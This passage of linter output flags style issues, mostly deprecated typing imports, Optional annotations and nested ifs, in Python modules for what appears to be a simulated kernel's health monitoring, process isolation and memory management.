    |                                            ^^^^
467 |         """Parse TOML content (use toml library in production)"""
468 |         try:
    |
help: Replace with `dict`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> kernel\health.py:22:1
   |
20 | from dataclasses import dataclass, field
21 | from enum import Enum
22 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |
help: Import from `collections.abc`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> kernel\health.py:22:1
   |
20 | from dataclasses import dataclass, field
21 | from enum import Enum
22 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> kernel\health.py:22:1
   |
20 | from dataclasses import dataclass, field
21 | from enum import Enum
22 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

UP045 [*] Use `X | None` for type annotations
  --> kernel\health.py:59:22
   |
57 |     consecutive_failures: int = 0
58 |     consecutive_successes: int = 0
59 |     last_check_time: Optional[float] = None
   |                      ^^^^^^^^^^^^^^^
60 |     last_status: HealthStatus = HealthStatus.UNKNOWN
61 |     last_error: Optional[str] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> kernel\health.py:61:17
   |
59 |     last_check_time: Optional[float] = None
60 |     last_status: HealthStatus = HealthStatus.UNKNOWN
61 |     last_error: Optional[str] = None
   |                 ^^^^^^^^^^^^^
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> kernel\health.py:71:20
   |
69 |     status: HealthStatus
70 |     last_checked: float
71 |     error_message: Optional[str] = None
   |                    ^^^^^^^^^^^^^
72 |     metadata: Dict[str, Any] = field(default_factory=dict)
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> kernel\health.py:72:15
   |
70 |     last_checked: float
71 |     error_message: Optional[str] = None
72 |     metadata: Dict[str, Any] = field(default_factory=dict)
   |               ^^^^
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> kernel\health.py:86:16
   |
84 |     failures: int = 0
85 |     state: str = "closed"  # closed, open, half-open
86 |     opened_at: Optional[float] = None
   |                ^^^^^^^^^^^^^^^
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\health.py:104:29
    |
102 |     def __init__(self):
103 |         # Health checks
104 |         self.health_checks: Dict[str, HealthCheck] = {}
    |                             ^^^^
105 |
106 |         # Dependency health
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\health.py:107:28
    |
106 |         # Dependency health
107 |         self.dependencies: Dict[str, DependencyHealth] = {}
    |                            ^^^^
108 |
109 |         # Circuit breakers
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\health.py:110:32
    |
109 |         # Circuit breakers
110 |         self.circuit_breakers: Dict[str, CircuitBreaker] = {}
    |                                ^^^^
111 |
112 |         # Component status overrides (for graceful degradation)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\health.py:113:32
    |
112 |         # Component status overrides (for graceful degradation)
113 |         self.status_overrides: Dict[str, HealthStatus] = {}
    |                                ^^^^
114 |
115 |         # Self-healing callbacks
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\health.py:116:33
    |
115 |         # Self-healing callbacks
116 |         self.healing_callbacks: Dict[str, List[Callable]] = {}
    |                                 ^^^^
117 |
118 |         # Thread safety
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\health.py:116:43
    |
115 |         # Self-healing callbacks
116 |         self.healing_callbacks: Dict[str, List[Callable]] = {}
    |                                           ^^^^
117 |
118 |         # Thread safety
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> kernel\health.py:123:33
    |
121 |         # Monitoring thread
122 |         self.monitoring_active = False
123 |         self.monitoring_thread: Optional[threading.Thread] = None
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
124 |
125 |         # Statistics
    |
help: Convert to `X | None`

SIM103 Return the condition directly
   --> kernel\health.py:217:13
    |
215 |                       return False  # Still open
216 |
217 | /             if cb.state == "half-open":
218 | |                 return True  # Allow one request to test
219 | |
220 | |             return False
    | |________________________^
221 |
222 |       def record_circuit_breaker_result(self, name: str, success: bool):
    |
help: Inline condition

SIM102 Use a single `if` statement instead of nested `if` statements
   --> kernel\health.py:238:17
    |
236 |                   cb.failures += 1
237 |
238 | /                 if cb.failures >= cb.failure_threshold:
239 | |                     if cb.state != "open":
    | |__________________________________________^
240 |                           cb.state = "open"
241 |                           cb.opened_at = time.time()
    |
help: Combine `if` statements using `and`

UP045 [*] Use `X | None` for type annotations
   --> kernel\health.py:292:45
    |
290 |             return check.last_status
291 |
292 |     def get_health_status(self, probe_type: Optional[ProbeType] = None) -> HealthStatus:
    |                                             ^^^^^^^^^^^^^^^^^^^
293 |         """
294 |         Get aggregated health status
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> kernel\health.py:327:51
    |
325 |             return HealthStatus.HEALTHY
326 |
327 |     def get_dependency_health(self, name: str) -> Optional[DependencyHealth]:
    |                                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
328 |         """Get health of specific dependency"""
329 |         with self.lock:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\health.py:414:36
    |
412 |                 logger.error(f"Health monitoring error: {e}")
413 |
414 |     def get_health_report(self) -> Dict[str, Any]:
    |                                    ^^^^
415 |         """Get comprehensive health report"""
416 |         with self.lock:
    |
help: Replace with `dict`

F401 [*] `os` imported but unused
  --> kernel\isolation.py:17:8
   |
16 | import logging
17 | import os
   |        ^^
18 | import threading
19 | from dataclasses import dataclass, field
   |
help: Remove unused import: `os`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> kernel\isolation.py:21:1
   |
19 | from dataclasses import dataclass, field
20 | from enum import Enum
21 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
22 |
23 | logger = logging.getLogger(__name__)
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> kernel\isolation.py:21:1
   |
19 | from dataclasses import dataclass, field
20 | from enum import Enum
21 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
22 |
23 | logger = logging.getLogger(__name__)
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> kernel\isolation.py:21:1
   |
19 | from dataclasses import dataclass, field
20 | from enum import Enum
21 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
22 |
23 | logger = logging.getLogger(__name__)
   |

F401 [*] `typing.List` imported but unused
  --> kernel\isolation.py:21:26
   |
19 | from dataclasses import dataclass, field
20 | from enum import Enum
21 | from typing import Dict, List, Optional, Set
   |                          ^^^^
22 |
23 | logger = logging.getLogger(__name__)
   |
help: Remove unused import: `typing.List`

UP045 [*] Use `X | None` for type annotations
  --> kernel\isolation.py:59:17
   |
57 |     """Cgroup resource limits"""
58 |
59 |     cpu_shares: Optional[int] = None  # CPU shares (1024 = 1 CPU)
   |                 ^^^^^^^^^^^^^
60 |     cpu_quota_us: Optional[int] = None  # CPU quota in microseconds
61 |     cpu_period_us: int = 100000  # CPU period (default 100ms)
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> kernel\isolation.py:60:19
   |
59 |     cpu_shares: Optional[int] = None  # CPU shares (1024 = 1 CPU)
60 |     cpu_quota_us: Optional[int] = None  # CPU quota in microseconds
   |                   ^^^^^^^^^^^^^
61 |     cpu_period_us: int = 100000  # CPU period (default 100ms)
62 |     memory_limit_bytes: Optional[int] = None  # Memory limit
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> kernel\isolation.py:62:25
   |
60 |     cpu_quota_us: Optional[int] = None  # CPU quota in microseconds
61 |     cpu_period_us: int = 100000  # CPU period (default 100ms)
62 |     memory_limit_bytes: Optional[int] = None  # Memory limit
   |                         ^^^^^^^^^^^^^
63 |     memory_swap_limit_bytes: Optional[int] = None  # Swap limit
64 |     io_weight: Optional[int] = None  # I/O weight (100-10000)
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> kernel\isolation.py:63:30
   |
61 |     cpu_period_us: int = 100000  # CPU period (default 100ms)
62 |     memory_limit_bytes: Optional[int] = None  # Memory limit
63 |     memory_swap_limit_bytes: Optional[int] = None  # Swap limit
   |                              ^^^^^^^^^^^^^
64 |     io_weight: Optional[int] = None  # I/O weight (100-10000)
65 |     pids_max: Optional[int] = None  # Max number of PIDs
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> kernel\isolation.py:64:16
   |
62 |     memory_limit_bytes: Optional[int] = None  # Memory limit
63 |     memory_swap_limit_bytes: Optional[int] = None  # Swap limit
64 |     io_weight: Optional[int] = None  # I/O weight (100-10000)
   |                ^^^^^^^^^^^^^
65 |     pids_max: Optional[int] = None  # Max number of PIDs
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> kernel\isolation.py:65:15
   |
63 |     memory_swap_limit_bytes: Optional[int] = None  # Swap limit
64 |     io_weight: Optional[int] = None  # I/O weight (100-10000)
65 |     pids_max: Optional[int] = None  # Max number of PIDs
   |               ^^^^^^^^^^^^^
   |
help: Convert to `X | None`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> kernel\isolation.py:72:17
   |
70 |     """Process isolation configuration"""
71 |
72 |     namespaces: Set[NamespaceType] = field(
   |                 ^^^
73 |         default_factory=lambda: {
74 |             NamespaceType.PID,
   |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> kernel\isolation.py:80:19
   |
78 |         }
79 |     )
80 |     capabilities: Set[Capability] = field(default_factory=set)
   |                   ^^^
81 |     resource_limits: ResourceLimits = field(default_factory=ResourceLimits)
82 |     allowed_syscalls: Optional[Set[str]] = None  # None = all allowed
   |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
  --> kernel\isolation.py:82:23
   |
80 |     capabilities: Set[Capability] = field(default_factory=set)
81 |     resource_limits: ResourceLimits = field(default_factory=ResourceLimits)
82 |     allowed_syscalls: Optional[Set[str]] = None  # None = all allowed
   |                       ^^^^^^^^^^^^^^^^^^
83 |     denied_syscalls: Set[str] = field(default_factory=set)
84 |     selinux_context: Optional[str] = None
   |
help: Convert to `X | None`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> kernel\isolation.py:82:32
   |
80 |     capabilities: Set[Capability] = field(default_factory=set)
81 |     resource_limits: ResourceLimits = field(default_factory=ResourceLimits)
82 |     allowed_syscalls: Optional[Set[str]] = None  # None = all allowed
   |                                ^^^
83 |     denied_syscalls: Set[str] = field(default_factory=set)
84 |     selinux_context: Optional[str] = None
   |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> kernel\isolation.py:83:22
   |
81 |     resource_limits: ResourceLimits = field(default_factory=ResourceLimits)
82 |     allowed_syscalls: Optional[Set[str]] = None  # None = all allowed
83 |     denied_syscalls: Set[str] = field(default_factory=set)
   |                      ^^^
84 |     selinux_context: Optional[str] = None
85 |     apparmor_profile: Optional[str] = None
   |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
  --> kernel\isolation.py:84:22
   |
82 |     allowed_syscalls: Optional[Set[str]] = None  # None = all allowed
83 |     denied_syscalls: Set[str] = field(default_factory=set)
84 |     selinux_context: Optional[str] = None
   |                      ^^^^^^^^^^^^^
85 |     apparmor_profile: Optional[str] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> kernel\isolation.py:85:23
   |
83 |     denied_syscalls: Set[str] = field(default_factory=set)
84 |     selinux_context: Optional[str] = None
85 |     apparmor_profile: Optional[str] = None
   |                       ^^^^^^^^^^^^^
   |
help: Convert to `X | None`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> kernel\isolation.py:96:14
   |
94 |     owner_pid: int
95 |     created_at: float
96 |     members: Set[int] = field(default_factory=set)  # PIDs in this namespace
   |              ^^^
   |
help: Replace with `set`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\isolation.py:128:26
    |
126 |     def __init__(self):
127 |         # Namespace management
128 |         self.namespaces: Dict[int, Namespace] = {}
    |                          ^^^^
129 |         self.next_namespace_id = 1
130 |         self.process_namespaces: Dict[int, Dict[NamespaceType, int]] = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\isolation.py:130:34
    |
128 |         self.namespaces: Dict[int, Namespace] = {}
129 |         self.next_namespace_id = 1
130 |         self.process_namespaces: Dict[int, Dict[NamespaceType, int]] = {}
    |                                  ^^^^
131 |
132 |         # Isolation configurations per process
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\isolation.py:130:44
    |
128 |         self.namespaces: Dict[int, Namespace] = {}
129 |         self.next_namespace_id = 1
130 |         self.process_namespaces: Dict[int, Dict[NamespaceType, int]] = {}
    |                                            ^^^^
131 |
132 |         # Isolation configurations per process
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\isolation.py:133:33
    |
132 |         # Isolation configurations per process
133 |         self.isolation_configs: Dict[int, IsolationConfig] = {}
    |                                 ^^^^
134 |
135 |         # Resource accounting per process
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\isolation.py:136:35
    |
135 |         # Resource accounting per process
136 |         self.resource_accounting: Dict[int, ResourceAccounting] = {}
    |                                   ^^^^
137 |
138 |         # Capability sets per process
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\isolation.py:139:36
    |
138 |         # Capability sets per process
139 |         self.process_capabilities: Dict[int, Set[Capability]] = {}
    |                                    ^^^^
140 |
141 |         # Seccomp filters per process
    |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> kernel\isolation.py:139:46
    |
138 |         # Capability sets per process
139 |         self.process_capabilities: Dict[int, Set[Capability]] = {}
    |                                              ^^^
140 |
141 |         # Seccomp filters per process
    |
help: Replace with `set`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\isolation.py:142:31
    |
141 |         # Seccomp filters per process
142 |         self.seccomp_filters: Dict[int, Set[str]] = {}
    |                               ^^^^
143 |
144 |         # Thread safety
    |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> kernel\isolation.py:142:41
    |
141 |         # Seccomp filters per process
142 |         self.seccomp_filters: Dict[int, Set[str]] = {}
    |                                         ^^^
143 |
144 |         # Thread safety
    |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
   --> kernel\isolation.py:158:33
    |
157 |     def create_isolated_process(
158 |         self, pid: int, config: Optional[IsolationConfig] = None
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^
159 |     ):
160 |         """
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> kernel\isolation.py:331:22
    |
329 |         self,
330 |         pid: int,
331 |         cpu_time_us: Optional[int] = None,
    |                      ^^^^^^^^^^^^^
332 |         memory_bytes: Optional[int] = None,
333 |         io_read_bytes: Optional[int] = None,
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> kernel\isolation.py:332:23
    |
330 |         pid: int,
331 |         cpu_time_us: Optional[int] = None,
332 |         memory_bytes: Optional[int] = None,
    |                       ^^^^^^^^^^^^^
333 |         io_read_bytes: Optional[int] = None,
334 |         io_write_bytes: Optional[int] = None,
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> kernel\isolation.py:333:24
    |
331 |         cpu_time_us: Optional[int] = None,
332 |         memory_bytes: Optional[int] = None,
333 |         io_read_bytes: Optional[int] = None,
    |                        ^^^^^^^^^^^^^
334 |         io_write_bytes: Optional[int] = None,
335 |         syscall_count: Optional[int] = None,
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> kernel\isolation.py:334:25
    |
332 |         memory_bytes: Optional[int] = None,
333 |         io_read_bytes: Optional[int] = None,
334 |         io_write_bytes: Optional[int] = None,
    |                         ^^^^^^^^^^^^^
335 |         syscall_count: Optional[int] = None,
336 |     ):
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> kernel\isolation.py:335:24
    |
333 |         io_read_bytes: Optional[int] = None,
334 |         io_write_bytes: Optional[int] = None,
335 |         syscall_count: Optional[int] = None,
    |                        ^^^^^^^^^^^^^
336 |     ):
337 |         """Update resource usage accounting"""
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> kernel\isolation.py:360:47
    |
358 |                 acct.syscalls_made += syscall_count
359 |
360 |     def get_resource_usage(self, pid: int) -> Optional[ResourceAccounting]:
    |                                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
361 |         """Get resource usage for process"""
362 |         with self.lock:
    |
help: Convert to `X | None`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> kernel\isolation.py:388:13
    |
387 |               # For IPC access, check IPC namespace
388 | /             if access_type in ["signal", "ipc", "shm"]:
389 | |                 if NamespaceType.IPC in ns1 and NamespaceType.IPC in ns2:
390 | |                     if ns1[NamespaceType.IPC] != ns2[NamespaceType.IPC]:
    | |________________________________________________________________________^
391 |                           self.stats["isolation_violations"] += 1
392 |                           logger.warning(
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> kernel\isolation.py:389:17
    |
387 |               # For IPC access, check IPC namespace
388 |               if access_type in ["signal", "ipc", "shm"]:
389 | /                 if NamespaceType.IPC in ns1 and NamespaceType.IPC in ns2:
390 | |                     if ns1[NamespaceType.IPC] != ns2[NamespaceType.IPC]:
    | |________________________________________________________________________^
391 |                           self.stats["isolation_violations"] += 1
392 |                           logger.warning(
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> kernel\isolation.py:398:13
    |
397 |               # For ptrace, check PID namespace
398 | /             if access_type == "ptrace":
399 | |                 if NamespaceType.PID in ns1 and NamespaceType.PID in ns2:
400 | |                     if ns1[NamespaceType.PID] != ns2[NamespaceType.PID]:
    | |________________________________________________________________________^
401 |                           self.stats["isolation_violations"] += 1
402 |                           logger.warning(
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> kernel\isolation.py:399:17
    |
397 |               # For ptrace, check PID namespace
398 |               if access_type == "ptrace":
399 | /                 if NamespaceType.PID in ns1 and NamespaceType.PID in ns2:
400 | |                     if ns1[NamespaceType.PID] != ns2[NamespaceType.PID]:
    | |________________________________________________________________________^
401 |                           self.stats["isolation_violations"] += 1
402 |                           logger.warning(
    |
help: Combine `if` statements using `and`

B007 Loop control variable `ns_type` not used within loop body
   --> kernel\isolation.py:414:21
    |
412 |             # Remove from namespaces
413 |             if pid in self.process_namespaces:
414 |                 for ns_type, ns_id in self.process_namespaces[pid].items():
    |                     ^^^^^^^
415 |                     if ns_id in self.namespaces:
416 |                         ns = self.namespaces[ns_id]
    |
help: Rename unused `ns_type` to `_ns_type`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> kernel\isolation.py:433:36
    |
431 |             logger.debug(f"Cleaned up isolation for process {pid}")
432 |
433 |     def _get_all_syscalls(self) -> Set[str]:
    |                                    ^^^
434 |         """Get set of all known syscalls"""
435 |         # Simplified - real implementation would read from kernel
    |
help: Replace with `set`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\isolation.py:535:38
    |
533 |         }
534 |
535 |     def get_isolation_stats(self) -> Dict:
    |                                      ^^^^
536 |         """Get isolation statistics"""
537 |         with self.lock:
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> kernel\memory.py:22:1
   |
20 | from dataclasses import dataclass, field
21 | from enum import Enum, IntEnum
22 | from typing import Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> kernel\memory.py:22:1
   |
20 | from dataclasses import dataclass, field
21 | from enum import Enum, IntEnum
22 | from typing import Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> kernel\memory.py:22:1
   |
20 | from dataclasses import dataclass, field
21 | from enum import Enum, IntEnum
22 | from typing import Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> kernel\memory.py:22:1
   |
20 | from dataclasses import dataclass, field
21 | from enum import Enum, IntEnum
22 | from typing import Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

UP045 [*] Use `X | None` for type annotations
  --> kernel\memory.py:52:22
   |
50 |     size: PageSize
51 |     state: PageState
52 |     virtual_address: Optional[int] = None
   |                      ^^^^^^^^^^^^^
53 |     owner_pid: Optional[int] = None
54 |     reference_count: int = 0
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> kernel\memory.py:53:16
   |
51 |     state: PageState
52 |     virtual_address: Optional[int] = None
53 |     owner_pid: Optional[int] = None
   |                ^^^^^^^^^^^^^
54 |     reference_count: int = 0
55 |     access_count: int = 0  # For LRU
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> kernel\memory.py:69:19
   |
67 |     virtual_address: int
68 |     size_bytes: int
69 |     page_numbers: List[int] = field(default_factory=list)
   |                   ^^^^
70 |     allocated_at: float = 0.0
71 |     is_shared: bool = False
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> kernel\memory.py:93:23
   |
92 |     def __init__(self):
93 |         self.entries: Dict[int, Page] = {}  # virtual_addr -> Page
   |                       ^^^^
94 |         self.lock = threading.RLock()
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> kernel\memory.py:102:43
    |
100 |             page.virtual_address = virtual_addr
101 |
102 |     def unmap(self, virtual_addr: int) -> Optional[Page]:
    |                                           ^^^^^^^^^^^^^^
103 |         """Unmap virtual address"""
104 |         with self.lock:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> kernel\memory.py:107:44
    |
105 |             return self.entries.pop(virtual_addr, None)
106 |
107 |     def lookup(self, virtual_addr: int) -> Optional[Page]:
    |                                            ^^^^^^^^^^^^^^
108 |         """Lookup physical page for virtual address"""
109 |         with self.lock:
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\memory.py:112:35
    |
110 |             return self.entries.get(virtual_addr)
111 |
112 |     def get_all_mappings(self) -> List[Tuple[int, Page]]:
    |                                   ^^^^
113 |         """Get all virtual-to-physical mappings"""
114 |         with self.lock:
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> kernel\memory.py:112:40
    |
110 |             return self.entries.get(virtual_addr)
111 |
112 |     def get_all_mappings(self) -> List[Tuple[int, Page]]:
    |                                        ^^^^^
113 |         """Get all virtual-to-physical mappings"""
114 |         with self.lock:
    |
help: Replace with `tuple`

UP045 [*] Use `X | None` for type annotations
   --> kernel\memory.py:132:32
    |
130 |     """
131 |
132 |     def __init__(self, config: Optional[MemoryManagerConfig] = None):
    |                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
133 |         self.config = config or MemoryManagerConfig()
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\memory.py:144:21
    |
143 |         # Physical page pool
144 |         self.pages: Dict[int, Page] = {}
    |                     ^^^^
145 |         self.free_pages: Set[int] = set()
    |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> kernel\memory.py:145:26
    |
143 |         # Physical page pool
144 |         self.pages: Dict[int, Page] = {}
145 |         self.free_pages: Set[int] = set()
    |                          ^^^
146 |
147 |         # Initialize page pool
    |
help: Replace with `set`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\memory.py:154:27
    |
153 |         # Per-process page tables
154 |         self.page_tables: Dict[int, PageTable] = {}
    |                           ^^^^
155 |
156 |         # Allocation tracking
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\memory.py:157:27
    |
156 |         # Allocation tracking
157 |         self.allocations: Dict[int, MemoryAllocation] = {}
    |                           ^^^^
158 |         self.next_allocation_id = 1
159 |         self.next_virtual_address = 0x1000  # Start at 4KB to avoid null
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\memory.py:162:30
    |
161 |         # Per-process memory usage
162 |         self.process_memory: Dict[int, int] = {}  # pid -> bytes allocated
    |                              ^^^^
163 |
164 |         # Swap space management
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\memory.py:165:24
    |
164 |         # Swap space management
165 |         self.swap_map: Dict[int, int] = {}  # swapped page -> swap slot
    |                        ^^^^
166 |         self.free_swap_slots: Set[int] = set(range(self.swap_pages))
    |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> kernel\memory.py:166:31
    |
164 |         # Swap space management
165 |         self.swap_map: Dict[int, int] = {}  # swapped page -> swap slot
166 |         self.free_swap_slots: Set[int] = set(range(self.swap_pages))
    |                               ^^^
167 |
168 |         # Page replacement queue (for LRU/Clock)
    |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\memory.py:169:33
    |
168 |         # Page replacement queue (for LRU/Clock)
169 |         self.replacement_queue: List[int] = []
    |                                 ^^^^
170 |         self.clock_hand: int = 0  # For Clock algorithm
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> kernel\memory.py:195:20
    |
193 |         size_bytes: int,
194 |         prefer_huge_pages: bool = False,
195 |         numa_node: Optional[int] = None,
    |                    ^^^^^^^^^^^^^
196 |     ) -> MemoryAllocation:
197 |         """
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> kernel\memory.py:286:54
    |
284 |             return allocation
285 |
286 |     def _allocate_pages(self, count: int, numa_node: Optional[int] = None) -> List[int]:
    |                                                      ^^^^^^^^^^^^^
287 |         """Allocate physical pages from free pool"""
288 |         allocated = []
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\memory.py:286:79
    |
284 |             return allocation
285 |
286 |     def _allocate_pages(self, count: int, numa_node: Optional[int] = None) -> List[int]:
    |                                                                               ^^^^
287 |         """Allocate physical pages from free pool"""
288 |         allocated = []
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\memory.py:310:41
    |
308 |         return allocated
309 |
310 |     def _free_pages(self, page_numbers: List[int]):
    |                                         ^^^^
311 |         """Return pages to free pool"""
312 |         for page_num in page_numbers:
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\memory.py:439:51
    |
437 |         return True
438 |
439 |     def _select_victim_pages(self, count: int) -> List[int]:
    |                                                   ^^^^
440 |         """Select victim pages for eviction using configured algorithm"""
441 |         algorithm = self.config.page_replacement_algorithm.lower()
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\memory.py:453:42
    |
451 |             return self._lru_select(count)
452 |
453 |     def _lru_select(self, count: int) -> List[int]:
    |                                          ^^^^
454 |         """Least Recently Used page replacement"""
455 |         # Sort pages by last access time
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\memory.py:465:44
    |
463 |         return [num for num, _ in allocated_pages[:count]]
464 |
465 |     def _clock_select(self, count: int) -> List[int]:
    |                                            ^^^^
466 |         """Clock (Second Chance) page replacement"""
467 |         victims = []
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\memory.py:489:43
    |
487 |         return victims
488 |
489 |     def _fifo_select(self, count: int) -> List[int]:
    |                                           ^^^^
490 |         """First In First Out page replacement"""
491 |         # Use allocation time as FIFO criterion
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\memory.py:584:35
    |
582 |         return (actual_runs - ideal_runs) / (max_runs - ideal_runs)
583 |
584 |     def get_memory_stats(self) -> Dict:
    |                                   ^^^^
585 |         """Get comprehensive memory statistics"""
586 |         with self.lock:
    |
help: Replace with `dict`

C401 Unnecessary generator (rewrite as a set comprehension)
   --> kernel\memory.py:606:38
    |
604 |                     len(self.free_swap_slots) if self.config.enable_swapping else 0
605 |                 ),
606 |                 "process_count": len(set(a.pid for a in self.allocations.values())),
